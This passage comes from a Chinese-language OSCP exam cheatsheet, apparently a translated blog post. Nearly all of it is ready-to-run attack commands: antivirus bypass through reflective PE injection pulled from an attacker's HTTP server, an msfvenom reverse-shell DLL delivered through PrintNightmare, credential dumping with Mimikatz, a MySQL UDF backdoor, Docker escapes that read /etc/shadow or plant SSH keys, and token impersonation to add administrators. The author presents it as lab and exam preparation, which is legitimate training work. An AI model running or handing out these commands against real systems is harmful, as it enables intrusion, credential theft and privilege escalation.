如果你在 powershell 中有输出，你可以看到目标可以通过哪些端口联系你，然后打开你的一组端口（delivery, reverse shell, smb servers, etc）。如果你没有输出（blind command），你仍然可以通过使用 wireshark 或 tcpdump 来查看你在哪些端口收到数据包。记住，数据包将使用PREROUTING进行路由，所以netcat将无法看到原始的目标端口。

在Linux上用bash逆向扫描tcp端口。

```
export ip=<IP>; for port in $(seq 20 6000); do nc -zv -w1 $ip $port& done
```

### **2. Damn AV, how to bypass it to run my exe?**

使用Powershell PE反射性注入。

```
# Use reflective PE injection over SMB:
powershell -ep bypass -sta -nop -c "iex (iwr <http://IP/empire.ps1> -UseBasicParsing); $PEBytes = [IO.File]::ReadAllBytes('\\\\IP\\\\Share\\\\File'); Invoke-ReflectivePEInjection -PEBytes $PEBytes"
# Over HTTP:
powershell -ep bypass -nop -c "iex (iwr <http://IP/Invoke-ReflectivePEInjection.ps1.1> -UseBasicParsing);Invoke-ReflectivePEInjection -PEURL <http://IP/file.exe>"
```

虽然，在现实中，最有可能被AV屏蔽的是powerhell脚本（需要绕过AMSI）。

[带有 PEBytes 版本的脚本](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)

[带有 PEUrl 版本的脚本](https://github.com/EmpireProject/Empire/blob/master/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1)以下是一些go反弹shell的列表：

https://gist.github.com/yougg/b47f4910767a74fcfe1077d21568070e

我使用[乱码](https://github.com/burrowers/garble)进行混淆，但请记住，**大多数混淆技术实际上会增加**脚本和二进制文件的可疑性。

### **3. 没有meterpreter getystem并得到SeLoadDriverPrivilege?**

使用 Print Nightmare, 我在实验室里用它取得了很大的成功：

```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o revshell.dll
wget <https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1>
python -m http.server 80
powershell -ep bypass -nop -c "iwr <http://IP/revshell.dll> -OutFile C:\\WINDOWS\\Temp\\revshell.dll;iex (iwr <http://IP/Invoke-Nightmare.ps1> -UseBasicParsing);Invoke-Nightmare -DLL C:\\WINDOWS\\Temp\\revshell.dll"
```

[Script](https://github.com/calebstewart/CVE-2021-1675)

### **4. 想要dump creds?**

```
powershell -ep bypass -nop -c "iex (iwr <http://IP/Invoke-PowerDump.ps1> -UseBasicParsing);Invoke-PowerDump"

powershell -ep bypass -nop -c "iex (iwr <http://IP/Invoke-Mimikatz.ps1> -UseBasicParsing); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"'"
```

[PowerDump](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1)[Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)

```
#使用mimikatz
mimi.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
```



### **5. 运行32位LaZagne ?**

[LaZagne](https://github.com/AlessandroZ/LaZagne)

https://github.com/therealunicornsecurity/ctf_data/blob/main/laz32.exe

### **6. 想下载东西，但只有Powershell 2.0的版本?**

```
$url = "<http://IP/file.exe>"
$path = "C:\\WINDOWS\\TEMP\\file.exe"
# param([string]$url, [string]$path)

if(!(Split-Path -parent $path) -or !(Test-Path -pathType Container (Split-Path -parent $path))) {
$targetFile = Join-Path $pwd (Split-Path -leaf $path)
}

(New-Object Net.WebClient).DownloadFile($url, $path)
$path
```

### **7. 想列出Windows上的开放端口?**

```
# TCP
Get-NetTCPConnection -State Listen| select LocalAddress,LocalPort,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}
# UDP
Get-NetUDPEndpoint | select LocalAddress,LocalPort,@{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}
```

### **8.  想在32位的Windows机器上运行IDA Free?**

https://www.scummvm.org/news/20180331/

### **9. 想利用一个有特权的MySQL进程?**

我不会比这里做的更好地解释它:

https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf

但我可以将其自动化:

```
# exploit.sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/tmp/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select * from mysql.func;
select do_system('<run backdoor>');
mysql -u root -p<password> -h <target> < exploit.sql
```

### **10. 想为32位的linux编译一个利用程序?**

```
gcc -m32 -march=i686 code.c -o exp -static
```

- 如果你遇到glibc版本错误，有两个选择。

  - 目标机上有gcc和所需的lib：在那里直接编译你的漏洞。
  - 没有gcc，或者缺少lib：在目标机上运行`ldd --version`，并尝试获得一个安装了相同libc的docker容器，从那里编译并转移到目标机上

### **11. 想交叉编译一个用于Windows的漏洞?**

```
# dpkg --add-architecture i386
# install mingw32/64
# 32 bits:
i686-w64-mingw32-g++-win32 exp.cpp -static -o exp
# 64 bits:
x86_64-w64-mingw32-g++ exp.cpp -static -o exp
```

在gcc中也有相应的功能.

### **12. 想在Meterpreter中运行一个命令并看到输出结果?**

```
execute -i -H -f "cmd"
```

### **13. 命令提示符已被管理员禁用?**

上传这个，并在本地运行cmd.exe: http://didierstevens.com/files/software/cmd-dll_v0_0_4.zip

### **14. 试图编译时得到转换错误 [MS17-017](https://www.exploit-db.com/exploits/44479) ?**

> error: cannot convert ‘STARTUPINFO’ {aka ‘STARTUPINFOA’} to ‘LPSTARTUPINFOW’ {aka ‘_STARTUPINFOW*’}

修改450行:

```
VOID xxCreateCmdLineProcess(VOID)
{
+    STARTUPINFOW si = { sizeof(si) };
-    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;
    WCHAR wzFilePath[MAX_PATH] = { L"yourexe.exe" };
    BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}
```

编译:

```
i686-w64-mingw32-g++-win32 44479.cpp -lgdi32 -lopengl32 -o lol.exe -static
```

### **15. 在运行Invoke-Mimikatz.ps1和Invoke-ReflectivePEInjection.ps1时得到一个错误。?**

> Exception calling "GetMethod" with "1" argument(s): "Ambiguous match found."

Replace this:

```
$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
```

With:

```
$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
```

### **16. 利用smb共享远程加载恶意DLL**

```
msfconsole
use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) > set srvhost IP //your LHOST
msf exploit(windows/smb/smb_delivery) > exploit
# locally:
rundll32.exe \\\\IP\\vabFG\\test.dll,0
```

我想你也可以使用*[bitsadmin](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)*。

### **17. 得到了docker suid或sudo?**

```
docker run -v /:/mnt -it ubuntu
```

一旦文件系统被加载，你就可以读写/etc/passwd和/etc/shadow。你也可以在/root/.ssh/authorized_keys中添加你的公共ssh密钥。

#### docker 逃逸

```
socks 逃逸

#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```



### **18. 想检查你可以开启哪些服务（劫持服务提权）?**

```
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\\Users" * /accepteula
```

### **19.  寻找静态编译的工具?**

https://github.com/ernw/static-toolbox

https://github.com/andrew-d/static-binaries

### **20. 获取SeImpersonate?**

使用meterpreter incognito:

```
load incognito
list tokens -u
impersonate_token <high privileges token>
```

使用meterpreter incognito如果你获得的令牌在域里，你可以转移到该AD用户有本地管理权限的其他目标。

利用获取的令牌远程添加用户：

```powershell
$Computername = <Your target>
$Username = <Your account>
$GroupName = "Administrators"
$DomainName = $env:USERDOMAIN
$Group = [ADSI]"WinNT://$ComputerName/$GroupName,group"
$User = [ADSI]"WinNT://$DomainName/$Username,user"
$Group.Add($User.Path)
```

或者使用 [JuicyPotato](https://ohpe.it/juicy-potato/)!

### **21. 想使用hashcat和John的伟大规则列表在本地生成自定义词表?**

```
hashcat --force <wordlist> -r /usr/share/hashcat/rules/dive.rule --stdout >> out.wl
john --wordlist=<wordlist> --rules --stdout > out.wl
```

您也可以使用这个[字典](https://github.com/NotSoSecure/password_cracking_rules)。

### **22.  努力获得NT系统?**

请记住，您有 **1** 次机会使用 Metasploit/Meterpreter，所以您为什么不直接使用。

选择用来获得AD的网络入口点的webshell是相当有用的，因为它允许我使用meterpreter快速获得特权，然后用chisel和naabu进行透视和扫描。

# **Conclusion**

我在实验室和考试期间肯定也有很多乐趣。我本来以为挑战太像 "CTF "了，而且是基于谜语，而不是在野外看到的场景，但事实并非如此。最后我觉得OSCP可能因为加入了AD集而变得更容易了。我确实认为它带来了一些现实性，因为AD通常很容易扎根。

如果你有任何问题或意见，请不要犹豫，在discord上联系我。

保持优雅的netsecurios!

# **References**

https://gtfobins.github.io/

https://book.hacktricks.xyz/welcome/readme

https://lolbas-project.github.io/

https://mishrasunny174.tech/post/vulnapp_trun/

https://github.com/calebstewart/CVE-2021-1675

https://osandamalith.com/2018/02/11/mysql-udf-exploitation/

https://github.com/mitre/caldera/issues/38

https://hunter2.gitbook.io/darthsidious/privilege-escalation/token-impersonation

https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html

https://github.com/akenofu/OSCP-Cheat-Sheet

https://www.noobsec.net/oscp-cheatsheet/

*[Table of contents generated with markdown-toc](http://ecotrust-canada.github.io/markdown-toc/)*

### **OSCP Cheatsheet**

------

August 2022 https://www.offensive-security.com/

## 

